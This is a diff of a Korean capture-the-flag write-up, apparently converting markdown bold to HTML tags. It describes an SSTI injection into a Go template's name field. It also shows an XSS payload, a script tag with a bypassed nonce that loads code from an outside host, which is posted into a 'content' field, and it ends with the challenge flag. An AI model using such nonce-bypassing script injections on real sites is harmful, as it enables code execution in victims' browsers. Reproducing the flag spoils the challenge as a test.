@@ -182,7 +182,7 @@ func index(w http.ResponseWriter, r *http.Request) {
 }
 ```
 
-만약 아래 **name**에 **{{ }}**와 같은 악성 페이로드를 삽입하게 된다면, **ssti** 공격이 발생한다.
+만약 아래 **name**에 <strong>{{ }}</strong>와 같은 악성 페이로드를 삽입하게 된다면, **ssti** 공격이 발생한다.
 
 ```go
 html := `<!DOCTYPE html>
@@ -408,7 +408,7 @@ app.listen(3000, '0.0.0.0', () => {
 	console.log('Server started on http://0.0.0.0:3000')
 })
 ```
-그리고, **<script src='https://h.bmcyver.dev' nonce='cf833634-6991-47b9-8f85-9ba91c8a1a44'></script>**를 **content**에 넣고 **post**하면 된다.
+그리고, <strong> &lt;script src='https://h.bmcyver.dev' nonce='cf833634-6991-47b9-8f85-9ba91c8a1a44'&gt;&lt;/script&gt; </strong>를 **content**에 넣고 **post**하면 된다.
 ![img2](img2.png)
 **flag{471c6236d52f164df2b5ff324bb351ee6935715d9a102a386022430b220f8072vxxwcj1zzg}**
 
